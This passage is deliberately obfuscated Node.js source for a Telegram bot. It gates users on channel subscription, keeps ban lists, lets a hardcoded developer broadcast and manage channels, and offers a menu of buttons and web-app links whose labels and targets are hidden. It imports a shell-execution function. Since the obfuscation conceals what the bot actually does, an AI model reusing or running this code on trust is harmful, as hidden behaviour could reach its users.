const _0x298049 = _0x1900;
(function (_0x2efeb9, _0x295219) {
    const _0x39f195 = _0x1900, _0x43c1b0 = _0x2efeb9();
    while (!![]) {
        try {
            const _0x31d13f = -parseInt(_0x39f195(0xb19)) / (0x6ba * 0x5 + -0x2558 + 0x3b7) + parseInt(_0x39f195(0x24e)) / (0xe36 + 0x127d * -0x1 + 0x449 * 0x1) + parseInt(_0x39f195(0x2de)) / (-0x2f * 0x71 + -0x53 * 0xf + 0x199f) * (parseInt(_0x39f195(0x534)) / (-0xb09 * -0x2 + 0x2 * -0x487 + 0xd * -0x100)) + -parseInt(_0x39f195(0x29e)) / (0x15 * 0x16a + 0x33 * -0x92 + -0x97 * 0x1) + parseInt(_0x39f195(0xd36)) / (-0x1 * -0x298 + 0x2 * -0x318 + 0x39e) + parseInt(_0x39f195(0x695)) / (-0x4fb + -0x16c4 + 0x12 * 0x18b) + parseInt(_0x39f195(0x713)) / (-0xeb3 * -0x1 + 0x3 * -0x40d + -0x7 * 0x5c) * (parseInt(_0x39f195(0x5d3)) / (-0x13e6 + 0x4 * 0x346 + 0x6d7));
            if (_0x31d13f === _0x295219)
                break;
            else
                _0x43c1b0['push'](_0x43c1b0['shift']());
        } catch (_0xc73813) {
            _0x43c1b0['push'](_0x43c1b0['shift']());
        }
    }
}(_0x2612, -0x19e6e9 + 0x62d0d + -0x101 * -0x21bb), require(_0x298049(0xbaf))[_0x298049(0x9db)]());
const TelegramBot = require(_0x298049(0x279) + _0x298049(0x55b) + 'i'), express = require(_0x298049(0xb6b)), bodyParser = require(_0x298049(0x59b) + 'r'), multer = require(_0x298049(0x7d0)), path = require(_0x298049(0x601)), base64 = require(_0x298049(0x611)), fs = require('fs'), {exec} = require(_0x298049(0x6ea) + _0x298049(0x855)), ffmpeg = require(_0x298049(0xa9c) + _0x298049(0x86a)), {PassThrough} = require(_0x298049(0x6ff)), {DateTime, Duration} = require(_0x298049(0xa0b)), fetch = require(_0x298049(0x8d2)), crypto = require(_0x298049(0x861)), axios = require(_0x298049(0x276)), uuid = require(_0x298049(0x56d)), {setTimeout} = require(_0x298049(0x57f)), {randomInt} = require(_0x298049(0x861)), {Readable} = require(_0x298049(0x6ff)), FormData = require(_0x298049(0x970)), cheerio = require(_0x298049(0xbe8)), dns = require(_0x298049(0xc63)), sleep = _0x432cef => new Promise(_0x146df5 => setTimeout(_0x146df5, _0x432cef)), tmo = process[_0x298049(0x79d)]['is'], botToken = process[_0x298049(0x79d)]['mn'], botUsername = process[_0x298049(0x79d)][_0x298049(0x3fc)], bot = new TelegramBot(botToken, {
        'polling': {
            'interval': 0x64,
            'autoStart': !![],
            'params': {
                'timeout': 0xa,
                'limit': 0x64
            }
        }
    }), developerId = 0x4070c8bf + 0x1c743e9a + 0x2d8829 * 0x579, fixedChannels = [
        {
            'id': _0x298049(0x7ef) + _0x298049(0x4d4),
            'name': _0x298049(0x769),
            'inviteLink': _0x298049(0x1fe) + _0x298049(0x244) + _0x298049(0xc1f)
        },
        {
            'id': _0x298049(0xb13) + _0x298049(0xd0b),
            'name': _0x298049(0xbf1),
            'inviteLink': _0x298049(0x1fe) + _0x298049(0x537) + _0x298049(0x75c)
        },
        {
            'id': _0x298049(0x9dd) + _0x298049(0x966),
            'name': _0x298049(0x1e4),
            'inviteLink': _0x298049(0x1fe) + _0x298049(0x6e0) + _0x298049(0x6fc)
        }
    ];
function _0x1900(_0x284e2c, _0x10ba1e) {
    const _0x3a13fa = _0x2612();
    return _0x1900 = function (_0x524e40, _0x148cd0) {
        _0x524e40 = _0x524e40 - (-0x716 + -0x1de5 + 0x2686);
        let _0x5023d1 = _0x3a13fa[_0x524e40];
        return _0x5023d1;
    }, _0x1900(_0x284e2c, _0x10ba1e);
}
let additionalChannels = [];
const channelsFile = _0x298049(0x2ec) + _0x298049(0x864);
if (fs[_0x298049(0x73e)](channelsFile))
    try {
        additionalChannels = JSON[_0x298049(0x368)](fs[_0x298049(0x8da) + 'nc'](channelsFile, _0x298049(0xc54)));
    } catch (_0x52bd12) {
        console[_0x298049(0x7b5)](_0x298049(0x3b8) + _0x298049(0x722) + _0x298049(0xa95), _0x52bd12);
    }
let bannedUsers = [];
const bannedUsersFile = _0x298049(0x8ad) + _0x298049(0xb48);
if (fs[_0x298049(0x73e)](bannedUsersFile))
    try {
        bannedUsers = JSON[_0x298049(0x368)](fs[_0x298049(0x8da) + 'nc'](bannedUsersFile, _0x298049(0xc54)));
    } catch (_0x1814b1) {
        console[_0x298049(0x7b5)](_0x298049(0x3b8) + _0x298049(0xbef) + _0x298049(0x7a8), _0x1814b1);
    }
let subscribers = new Set(), isPaidBot = ![];
function saveChannels() {
    const _0x720c3a = _0x298049;
    fs[_0x720c3a(0x1ca) + _0x720c3a(0x85f)](channelsFile, JSON[_0x720c3a(0x8a7)](additionalChannels, null, 0xa19 * -0x3 + 0x3c0 + 0x7 * 0x3cb));
}
function saveBannedUsers() {
    const _0x509995 = _0x298049;
    fs[_0x509995(0x1ca) + _0x509995(0x85f)](bannedUsersFile, JSON[_0x509995(0x8a7)](bannedUsers, null, 0x2436 + 0x1601 + -0x3a35));
}
function isDeveloper(_0xc39c84) {
    const _0x4ea897 = _0x298049, _0x38e4cf = {
            'upjSa': function (_0x1d0da3, _0x3acdc8) {
                return _0x1d0da3 === _0x3acdc8;
            }
        };
    return _0x38e4cf[_0x4ea897(0x84c)](_0xc39c84, developerId);
}
function isOldMessage(_0x224d56) {
    const _0x47a9d3 = _0x298049, _0x12a931 = {
            'OBCtF': function (_0x59baad, _0x1db902) {
                return _0x59baad / _0x1db902;
            },
            'qQNgP': function (_0x30c5d7, _0x31f923) {
                return _0x30c5d7 > _0x31f923;
            },
            'XmbKk': function (_0x3e96cc, _0x2dafbb) {
                return _0x3e96cc - _0x2dafbb;
            }
        }, _0x32dd28 = Math[_0x47a9d3(0xac9)](_0x12a931[_0x47a9d3(0xc49)](Date[_0x47a9d3(0x1ac)](), -0x1456 + -0x1 * 0x1df + 0x1a1d * 0x1));
    return _0x12a931[_0x47a9d3(0x862)](_0x12a931[_0x47a9d3(0x5f5)](_0x32dd28, _0x224d56[_0x47a9d3(0x3f2)]), -0x1cf + 0x1a * -0x16f + 0x27c9);
}
async function checkUserSubscription(_0x4a66ea) {
    const _0x4ab435 = _0x298049, _0x517348 = {
            'dgTDq': function (_0x488ccf, _0x3c21bf) {
                return _0x488ccf === _0x3c21bf;
            },
            'qSMKL': _0x4ab435(0x8a8),
            'mhDyM': function (_0x766f45, _0x48cac0) {
                return _0x766f45 === _0x48cac0;
            },
            'xOTTW': _0x4ab435(0x388)
        }, _0x2a012b = fixedChannels[_0x4ab435(0x953)](additionalChannels);
    for (let _0x4132fd of _0x2a012b) {
        try {
            const _0x1e3d71 = await bot[_0x4ab435(0xb42) + _0x4ab435(0xae9)](_0x4132fd['id'], _0x4a66ea);
            if (_0x517348[_0x4ab435(0xb63)](_0x1e3d71[_0x4ab435(0x1b1)], _0x517348[_0x4ab435(0x615)]) || _0x517348[_0x4ab435(0x418)](_0x1e3d71[_0x4ab435(0x1b1)], _0x517348[_0x4ab435(0x77f)]))
                return ![];
        } catch (_0x4665b6) {
            return console[_0x4ab435(0x9d7)](_0x4ab435(0xb0c) + _0x4ab435(0x86e) + _0x4ab435(0xc14) + _0x4132fd[_0x4ab435(0xd02)] + ':', _0x4665b6[_0x4ab435(0x33c)]), ![];
        }
    }
    return !![];
}
async function showSubscriptionButtons(_0x5d6039) {
    const _0x101bfd = _0x298049, _0x318557 = { 'FCHlE': _0x101bfd(0x2e9) + _0x101bfd(0xba9) + _0x101bfd(0xc36) + _0x101bfd(0x2c1) + _0x101bfd(0xb85) + _0x101bfd(0xae2) }, _0x4b1b54 = _0x318557[_0x101bfd(0x7ca)], _0x3c56b6 = fixedChannels[_0x101bfd(0x953)](additionalChannels), _0x53f137 = _0x3c56b6[_0x101bfd(0x5c0)](_0x4c53c6 => [{
                'text': _0x101bfd(0x657) + _0x4c53c6[_0x101bfd(0xd02)],
                'url': _0x4c53c6[_0x101bfd(0x648)]
            }]);
    await bot[_0x101bfd(0xb04) + 'e'](_0x5d6039, _0x4b1b54, { 'reply_markup': { 'inline_keyboard': _0x53f137 } })[_0x101bfd(0x40a)](() => {
    });
}
bot[_0x298049(0x65c)](/\/start/, async _0x7529ed => {
    const _0x298397 = _0x298049, _0x4590ea = {
            'jiZxj': function (_0x9055ab, _0x409652) {
                return _0x9055ab(_0x409652);
            },
            'JiDwJ': _0x298397(0xccc) + _0x298397(0xb76) + _0x298397(0x22a),
            'ilpoW': _0x298397(0x502) + _0x298397(0xbca) + _0x298397(0x520) + _0x298397(0x903) + _0x298397(0x59c) + _0x298397(0xd2e) + _0x298397(0xb16),
            'jvxyw': _0x298397(0x474) + _0x298397(0xb6c) + _0x298397(0xcf6) + '.',
            'HqHHq': _0x298397(0x1f5) + _0x298397(0x451) + _0x298397(0x516),
            'CyFiO': _0x298397(0xacb) + _0x298397(0x8de) + _0x298397(0x389),
            'iFxYO': _0x298397(0xacb) + _0x298397(0xb9b) + _0x298397(0xce6),
            'JLZBL': _0x298397(0x285) + _0x298397(0x871),
            'SUIvh': _0x298397(0xcf8) + _0x298397(0x9a8),
            'noIZJ': _0x298397(0x1ff) + _0x298397(0x832) + _0x298397(0x772),
            'JJabm': _0x298397(0xa9d) + 's',
            'RqUIF': _0x298397(0x1f4) + _0x298397(0xc71),
            'HqhWB': _0x298397(0x486) + _0x298397(0x482),
            'bhkrZ': _0x298397(0x8a9) + _0x298397(0xb87),
            'qgmyG': _0x298397(0x9a4) + _0x298397(0x83d),
            'tvfxN': _0x298397(0x60e) + _0x298397(0xb4a),
            'cmCTJ': _0x298397(0x80a) + _0x298397(0xc32),
            'GkhLr': _0x298397(0x21d) + _0x298397(0xcb1),
            'Ademj': _0x298397(0x265),
            'KOIyC': _0x298397(0x61b) + _0x298397(0x37b),
            'QVDgI': _0x298397(0xaf3) + 're',
            'HZgjt': _0x298397(0x89b) + _0x298397(0x1e1),
            'qPbDM': _0x298397(0x9ca),
            'epeAw': _0x298397(0x521) + _0x298397(0x40f),
            'uPjSF': _0x298397(0xab3) + _0x298397(0x3ce),
            'NLShY': _0x298397(0x1bd) + _0x298397(0x49a) + _0x298397(0x24f) + _0x298397(0xb0f) + _0x298397(0x53f),
            'qkbAE': _0x298397(0xbf3) + _0x298397(0x5e0),
            'iYlht': _0x298397(0x429) + _0x298397(0xa8f),
            'UfPaa': _0x298397(0x5ac) + _0x298397(0x6a5),
            'NmQVs': _0x298397(0x9fb) + _0x298397(0xa36) + _0x298397(0xb99) + _0x298397(0x8a0) + _0x298397(0x958),
            'iTNbf': _0x298397(0x1b9) + _0x298397(0xcd2),
            'AUnoF': _0x298397(0xac7),
            'OrBcv': _0x298397(0x8fd) + _0x298397(0x6db) + _0x298397(0x633),
            'TRHEi': _0x298397(0x3f6),
            'ExBwA': _0x298397(0x8b3) + _0x298397(0x621),
            'hdnfZ': _0x298397(0x412) + _0x298397(0xa80) + _0x298397(0xc16) + _0x298397(0x8cb) + _0x298397(0x5df),
            'uxKuf': _0x298397(0x6e8) + _0x298397(0x2f7),
            'uTPXb': _0x298397(0x1e9),
            'nZGUG': _0x298397(0x9eb) + _0x298397(0x83c),
            'EVwzy': _0x298397(0x7fb) + _0x298397(0x8dd) + _0x298397(0x43a) + _0x298397(0x571) + 'e/',
            'RvQKy': _0x298397(0x80c) + '💳',
            'FjhFe': _0x298397(0x4ab) + _0x298397(0xaf1),
            'LuVNp': _0x298397(0xce7) + _0x298397(0xae0),
            'GaYGC': _0x298397(0x430) + _0x298397(0x687),
            'VZlQr': _0x298397(0x594) + _0x298397(0x32d),
            'XfXnY': _0x298397(0x5ce) + _0x298397(0x201),
            'LKRRN': _0x298397(0x1a9) + _0x298397(0x300),
            'nAiyU': _0x298397(0x6bc),
            'sYvXq': _0x298397(0xca6) + _0x298397(0x6d0),
            'htRwU': _0x298397(0x29c) + 's',
            'yWsId': _0x298397(0x823) + _0x298397(0x9df),
            'WzoRk': _0x298397(0x1b2) + _0x298397(0x1f2),
            'TAQKX': _0x298397(0xb39) + _0x298397(0xd35),
            'KraId': _0x298397(0xb62) + _0x298397(0x51b) + '0',
            'JaqmM': _0x298397(0xc70) + _0x298397(0xd09),
            'ZbiTT': _0x298397(0xa8a),
            'Dwllz': _0x298397(0x583) + _0x298397(0x95d),
            'ffzkE': _0x298397(0x568) + 'xt',
            'HtkOX': _0x298397(0xc21) + _0x298397(0x805),
            'PjzXc': _0x298397(0x720) + 'e',
            'NnIiU': _0x298397(0x39b) + 'r',
            'EBtjh': _0x298397(0x50c) + _0x298397(0x479),
            'hzYWK': _0x298397(0x1fe) + _0x298397(0xb7e) + _0x298397(0x379) + _0x298397(0xbfa),
            'ZKVup': _0x298397(0xcea) + _0x298397(0x3d3),
            'InIYF': _0x298397(0x1fe) + _0x298397(0x28d),
            'cIqpY': _0x298397(0x8e9) + _0x298397(0x5dd)
        }, _0x5e1f44 = _0x7529ed[_0x298397(0x556)]['id'];
    if (_0x4590ea[_0x298397(0x7f1)](isOldMessage, _0x7529ed)) {
        console[_0x298397(0x9d7)](_0x4590ea[_0x298397(0xa53)], _0x5e1f44);
        return;
    }
    try {
        if (isPaidBot)
            return await bot[_0x298397(0xb04) + 'e'](_0x5e1f44, _0x4590ea[_0x298397(0x42d)]);
        if (bannedUsers[_0x298397(0x948)](_0x5e1f44))
            return await bot[_0x298397(0xb04) + 'e'](_0x5e1f44, _0x4590ea[_0x298397(0xce3)]);
        const _0x5cfce9 = await _0x4590ea[_0x298397(0x7f1)](checkUserSubscription, _0x5e1f44);
        if (!_0x5cfce9)
            return await _0x4590ea[_0x298397(0x7f1)](showSubscriptionButtons, _0x5e1f44);
        subscribers[_0x298397(0x652)](_0x5e1f44);
        const _0x44d2fd = _0x4590ea[_0x298397(0xcdc)], _0x47e4fa = [
                [
                    {
                        'text': _0x4590ea[_0x298397(0xd2d)],
                        'callback_data': _0x298397(0x363) + _0x298397(0x8fa) + _0x5e1f44
                    },
                    {
                        'text': _0x4590ea[_0x298397(0xce1)],
                        'callback_data': _0x298397(0xb64) + 'k:' + _0x5e1f44
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x619)],
                        'callback_data': _0x298397(0x9e3) + _0x298397(0x659) + _0x5e1f44
                    },
                    {
                        'text': _0x4590ea[_0x298397(0xa18)],
                        'callback_data': _0x298397(0x682) + 'o:' + _0x5e1f44
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x718)],
                        'callback_data': _0x4590ea[_0x298397(0xcb9)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x865)],
                        'callback_data': _0x4590ea[_0x298397(0x7e3)]
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0xc3d)],
                        'callback_data': _0x4590ea[_0x298397(0xbec)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x34c)],
                        'callback_data': _0x298397(0x996) + _0x298397(0x2e0) + _0x5e1f44
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x8ed)],
                        'callback_data': _0x298397(0x7c4) + _0x298397(0xbe3) + _0x5e1f44
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x6d2)],
                        'callback_data': _0x4590ea[_0x298397(0x310)]
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x3d4)],
                        'callback_data': _0x4590ea[_0x298397(0x99f)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0xa0a)],
                        'callback_data': _0x4590ea[_0x298397(0xb7a)]
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0xc35)],
                        'callback_data': _0x298397(0xd25) + 'k:' + _0x5e1f44
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x551)],
                        'web_app': { 'url': _0x4590ea[_0x298397(0x672)] }
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x857)],
                        'callback_data': _0x4590ea[_0x298397(0x97b)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x342)],
                        'web_app': { 'url': _0x4590ea[_0x298397(0xd2b)] }
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0xc0b)],
                        'callback_data': _0x4590ea[_0x298397(0x33d)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x4cb)],
                        'callback_data': _0x4590ea[_0x298397(0x4f2)]
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0xbbf)],
                        'web_app': { 'url': _0x4590ea[_0x298397(0x74b)] }
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x96b)],
                        'callback_data': _0x4590ea[_0x298397(0x4b9)]
                    }
                ],
                [{
                        'text': _0x4590ea[_0x298397(0x2da)],
                        'web_app': { 'url': _0x4590ea[_0x298397(0x205)] }
                    }],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x8c4)],
                        'callback_data': _0x4590ea[_0x298397(0x1e8)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0xccf)],
                        'callback_data': _0x4590ea[_0x298397(0x6c0)]
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x390)],
                        'callback_data': _0x4590ea[_0x298397(0x6b6)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0xc0e)],
                        'callback_data': _0x4590ea[_0x298397(0x227)]
                    }
                ],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x663)],
                        'callback_data': _0x4590ea[_0x298397(0xc73)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0xc39)],
                        'callback_data': _0x4590ea[_0x298397(0x7f7)]
                    }
                ],
                [{
                        'text': _0x4590ea[_0x298397(0x18f)],
                        'callback_data': _0x4590ea[_0x298397(0x28b)]
                    }],
                [
                    {
                        'text': _0x4590ea[_0x298397(0x334)],
                        'callback_data': _0x4590ea[_0x298397(0xa58)]
                    },
                    {
                        'text': _0x4590ea[_0x298397(0x4bf)],
                        'callback_data': _0x4590ea[_0x298397(0xb82)]
                    }
                ],
                [{
                        'text': _0x4590ea[_0x298397(0x50d)],
                        'callback_data': _0x4590ea[_0x298397(0x1a0)]
                    }],
                [{
                        'text': _0x4590ea[_0x298397(0x342)],
                        'callback_data': _0x4590ea[_0x298397(0x67e)]
                    }],
                [{
                        'text': _0x4590ea[_0x298397(0x86d)],
                        'url': _0x4590ea[_0x298397(0x764)]
                    }],
                [{
                        'text': _0x4590ea[_0x298397(0x41a)],
                        'url': _0x4590ea[_0x298397(0x9bb)]
                    }]
            ];
        await bot[_0x298397(0xb04) + 'e'](_0x5e1f44, _0x44d2fd, { 'reply_markup': { 'inline_keyboard': _0x47e4fa } })[_0x298397(0x40a)](_0x4be988 => console[_0x298397(0x7b5)](_0x298397(0xb51) + _0x298397(0xcf5), _0x4be988[_0x298397(0x33c)]));
    } catch (_0x4b85c3) {
        console[_0x298397(0x7b5)](_0x4590ea[_0x298397(0xbde)], _0x4b85c3[_0x298397(0x33c)]);
    }
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x122d1a => {
    const _0x44f5d3 = _0x298049, _0x3fd8b2 = {
            'ExJYb': function (_0x245eef, _0x5ee12d) {
                return _0x245eef(_0x5ee12d);
            },
            'gDXnx': _0x44f5d3(0x4d9) + _0x44f5d3(0x706) + _0x44f5d3(0x895),
            'HqLeg': _0x44f5d3(0x94e) + _0x44f5d3(0x734) + _0x44f5d3(0xd22)
        }, _0x529c5b = _0x122d1a[_0x44f5d3(0x33c)][_0x44f5d3(0x556)]['id'];
    if (_0x3fd8b2[_0x44f5d3(0x70d)](isOldMessage, _0x122d1a)) {
        console[_0x44f5d3(0x9d7)](_0x3fd8b2[_0x44f5d3(0x5d9)], _0x529c5b);
        return;
    }
    try {
        await bot[_0x44f5d3(0x5a1) + _0x44f5d3(0x600)](_0x122d1a['id'])[_0x44f5d3(0x40a)](() => {
        });
    } catch (_0x15610c) {
        console[_0x44f5d3(0x7b5)](_0x3fd8b2[_0x44f5d3(0x570)], _0x15610c[_0x44f5d3(0x33c)]);
    }
}), process['on'](_0x298049(0x847) + _0x298049(0x7bb), _0x419f32 => {
    const _0x57a51b = _0x298049, _0x5960a6 = { 'gzKQR': _0x57a51b(0xc4a) + _0x57a51b(0x9e0) };
    console[_0x57a51b(0x7b5)](_0x5960a6[_0x57a51b(0x406)], _0x419f32);
}), process['on'](_0x298049(0xb34) + _0x298049(0x353), _0x87aa2 => {
    const _0x5250b7 = _0x298049, _0x2714ac = { 'lmDog': _0x5250b7(0xb0d) + _0x5250b7(0x8c6) };
    console[_0x5250b7(0x7b5)](_0x2714ac[_0x5250b7(0x64e)], _0x87aa2);
});
const baseUrl = process[_0x298049(0x79d)]['rs'], sessionState = {
        'banUser': ![],
        'unbanUser': ![],
        'broadcast': ![],
        'addChannel': ![],
        'removeChannel': ![]
    };
function sendAdminPanel(_0x81e19f) {
    const _0x4f7b75 = _0x298049, _0x4397e4 = {
            'pTbBA': function (_0x2ed678, _0x2554d2) {
                return _0x2ed678 === _0x2554d2;
            },
            'TgBpH': _0x4f7b75(0x998),
            'Sakin': _0x4f7b75(0x455),
            'ySLpC': _0x4f7b75(0x599) + _0x4f7b75(0x928),
            'esqlb': _0x4f7b75(0xadc),
            'qGRwF': _0x4f7b75(0x394) + 'ة',
            'sTLVB': _0x4f7b75(0xa52),
            'xvPSK': _0x4f7b75(0x48a) + _0x4f7b75(0x82f) + _0x4f7b75(0x2dd),
            'maBaE': _0x4f7b75(0xd0a) + 'l',
            'wyUhg': _0x4f7b75(0x91d) + _0x4f7b75(0x82f) + _0x4f7b75(0x2dd),
            'MRQtY': _0x4f7b75(0x41b) + _0x4f7b75(0x787),
            'SBuju': _0x4f7b75(0xd21) + _0x4f7b75(0x6dd) + 'ع',
            'jonfe': _0x4f7b75(0x497),
            'nKqIh': _0x4f7b75(0x30e) + _0x4f7b75(0x3e5),
            'ERROy': _0x4f7b75(0x30a),
            'oydCz': _0x4f7b75(0xbf8) + _0x4f7b75(0x785)
        };
    if (_0x4397e4[_0x4f7b75(0x885)](_0x81e19f, developerId)) {
        const _0x463dc0 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x4397e4[_0x4f7b75(0x96f)],
                            'callback_data': _0x4397e4[_0x4f7b75(0xa04)]
                        }],
                    [{
                            'text': _0x4397e4[_0x4f7b75(0x5e4)],
                            'callback_data': _0x4397e4[_0x4f7b75(0x8f0)]
                        }],
                    [{
                            'text': _0x4397e4[_0x4f7b75(0x9da)],
                            'callback_data': _0x4397e4[_0x4f7b75(0x93c)]
                        }],
                    [{
                            'text': _0x4397e4[_0x4f7b75(0x6b5)],
                            'callback_data': _0x4397e4[_0x4f7b75(0x2e5)]
                        }],
                    [{
                            'text': _0x4397e4[_0x4f7b75(0x723)],
                            'callback_data': _0x4397e4[_0x4f7b75(0xacd)]
                        }],
                    [{
                            'text': _0x4397e4[_0x4f7b75(0x34a)],
                            'callback_data': _0x4397e4[_0x4f7b75(0xcaa)]
                        }],
                    [{
                            'text': _0x4397e4[_0x4f7b75(0x9fd)],
                            'callback_data': _0x4397e4[_0x4f7b75(0x513)]
                        }]
                ]
            }
        };
        bot[_0x4f7b75(0xb04) + 'e'](_0x81e19f, _0x4397e4[_0x4f7b75(0x82d)], _0x463dc0);
    }
}
bot['on'](_0x298049(0x33c), _0x27b393 => {
    const _0x5ac5a3 = _0x298049, _0x4d0b7c = {
            'TxBnY': function (_0x184e2c, _0x599ad7) {
                return _0x184e2c !== _0x599ad7;
            },
            'IhTxP': function (_0x2254b7, _0x341cd1) {
                return _0x2254b7(_0x341cd1);
            },
            'LhXUQ': function (_0x266b31) {
                return _0x266b31();
            },
            'aLgev': function (_0x106142) {
                return _0x106142();
            },
            'uKtJs': _0x5ac5a3(0xb0b) + _0x5ac5a3(0x70a) + _0x5ac5a3(0x7a2) + _0x5ac5a3(0x457),
            'jnWBn': function (_0x246e6e, _0x466eaa) {
                return _0x246e6e === _0x466eaa;
            },
            'xQubt': _0x5ac5a3(0x54a) + _0x5ac5a3(0x1bc) + _0x5ac5a3(0xbda) + _0x5ac5a3(0xc66) + _0x5ac5a3(0xb7c) + _0x5ac5a3(0x4cc),
            'OVoGW': function (_0x4b0122, _0x118635) {
                return _0x4b0122 !== _0x118635;
            },
            'uuSLI': function (_0x9343df) {
                return _0x9343df();
            },
            'YAdcH': _0x5ac5a3(0x463) + _0x5ac5a3(0x236) + _0x5ac5a3(0x45f) + _0x5ac5a3(0x851)
        }, _0x423804 = _0x27b393[_0x5ac5a3(0x556)]['id'];
    if (_0x4d0b7c[_0x5ac5a3(0x9d6)](_0x423804, developerId))
        return;
    if (sessionState[_0x5ac5a3(0x420)]) {
        const _0x1b7a4b = _0x4d0b7c[_0x5ac5a3(0x45a)](parseInt, _0x27b393[_0x5ac5a3(0x8e5)]);
        !bannedUsers[_0x5ac5a3(0x948)](_0x1b7a4b) ? (bannedUsers[_0x5ac5a3(0x39e)](_0x1b7a4b), _0x4d0b7c[_0x5ac5a3(0x2a6)](saveBannedUsers), bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x5ac5a3(0x670) + _0x5ac5a3(0x7a4) + _0x1b7a4b)) : bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x5ac5a3(0x575) + _0x1b7a4b + (_0x5ac5a3(0x4f9) + _0x5ac5a3(0xb17))), sessionState[_0x5ac5a3(0x420)] = ![];
    } else {
        if (sessionState[_0x5ac5a3(0x856)]) {
            const _0x27ef9e = _0x4d0b7c[_0x5ac5a3(0x45a)](parseInt, _0x27b393[_0x5ac5a3(0x8e5)]);
            bannedUsers = bannedUsers[_0x5ac5a3(0xbf9)](_0xee30ad => _0xee30ad !== _0x27ef9e), _0x4d0b7c[_0x5ac5a3(0x8f5)](saveBannedUsers), bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x5ac5a3(0xc7e) + _0x5ac5a3(0x79b) + _0x5ac5a3(0xaba) + _0x27ef9e), sessionState[_0x5ac5a3(0x856)] = ![];
        } else {
            if (sessionState[_0x5ac5a3(0xa52)])
                subscribers[_0x5ac5a3(0x9a0)](_0x39e3f7 => {
                    const _0x438286 = _0x5ac5a3;
                    bot[_0x438286(0xb04) + 'e'](_0x39e3f7, _0x27b393[_0x438286(0x8e5)]);
                }), bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x4d0b7c[_0x5ac5a3(0x81c)]), sessionState[_0x5ac5a3(0xa52)] = ![];
            else {
                if (sessionState[_0x5ac5a3(0x979)]) {
                    const _0x30ebfa = _0x27b393[_0x5ac5a3(0x8e5)][_0x5ac5a3(0xb11)](',');
                    if (_0x4d0b7c[_0x5ac5a3(0x9ef)](_0x30ebfa[_0x5ac5a3(0x825)], -0x1 * 0x20d3 + 0x69 * -0xd + 0x262b)) {
                        const _0x2ca9b5 = {
                            'id': _0x30ebfa[0x2 * 0x406 + 0x1 * -0x1bd7 + 0x9 * 0x233][_0x5ac5a3(0x5b6)](),
                            'name': _0x30ebfa[-0x1043 + -0x212c + 0xe2 * 0x38][_0x5ac5a3(0x5b6)](),
                            'inviteLink': _0x30ebfa[0x17a + 0x8b * 0x9 + 0x65b * -0x1][_0x5ac5a3(0x5b6)]()
                        };
                        additionalChannels[_0x5ac5a3(0x39e)](_0x2ca9b5), _0x4d0b7c[_0x5ac5a3(0x2a6)](saveChannels), bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x5ac5a3(0xcfa) + _0x5ac5a3(0x99d) + _0x5ac5a3(0x4a4) + _0x5ac5a3(0x52a) + _0x2ca9b5[_0x5ac5a3(0xd02)]);
                    } else
                        bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x4d0b7c[_0x5ac5a3(0x7c7)]);
                    sessionState[_0x5ac5a3(0x979)] = ![];
                } else {
                    if (sessionState[_0x5ac5a3(0xbb8) + _0x5ac5a3(0x717)]) {
                        const _0x5ba356 = _0x27b393[_0x5ac5a3(0x8e5)][_0x5ac5a3(0x5b6)](), _0xd22e34 = additionalChannels[_0x5ac5a3(0x55d)](_0x5bdb3f => _0x5bdb3f['id'] === _0x5ba356);
                        if (_0x4d0b7c[_0x5ac5a3(0x325)](_0xd22e34, -(-0xd2f + 0x2161 * 0x1 + 0x1431 * -0x1))) {
                            const _0x3a5689 = additionalChannels[_0x5ac5a3(0x7fa)](_0xd22e34, -0xf1a * 0x1 + -0x6cb + -0x15e6 * -0x1);
                            _0x4d0b7c[_0x5ac5a3(0xba1)](saveChannels), bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x5ac5a3(0x9e6) + _0x5ac5a3(0x99d) + _0x5ac5a3(0x4a4) + _0x5ac5a3(0x52a) + _0x3a5689[-0x1f4 * 0x7 + -0x13ff + 0x21ab][_0x5ac5a3(0xd02)]);
                        } else
                            bot[_0x5ac5a3(0xb04) + 'e'](_0x423804, _0x4d0b7c[_0x5ac5a3(0x6c1)]);
                        sessionState[_0x5ac5a3(0xbb8) + _0x5ac5a3(0x717)] = ![];
                    }
                }
            }
        }
    }
}), bot[_0x298049(0x65c)](/\/mm/, _0x5e45cd => {
    const _0x39ff27 = _0x298049, _0x527283 = {
            'NMiVz': function (_0xfa0099, _0x3483a1) {
                return _0xfa0099 === _0x3483a1;
            },
            'EpoVD': function (_0x4ac273, _0xa040c8) {
                return _0x4ac273(_0xa040c8);
            },
            'LrESv': _0x39ff27(0xcc6) + _0x39ff27(0x69e)
        }, _0x27f3e8 = _0x5e45cd[_0x39ff27(0x556)]['id'];
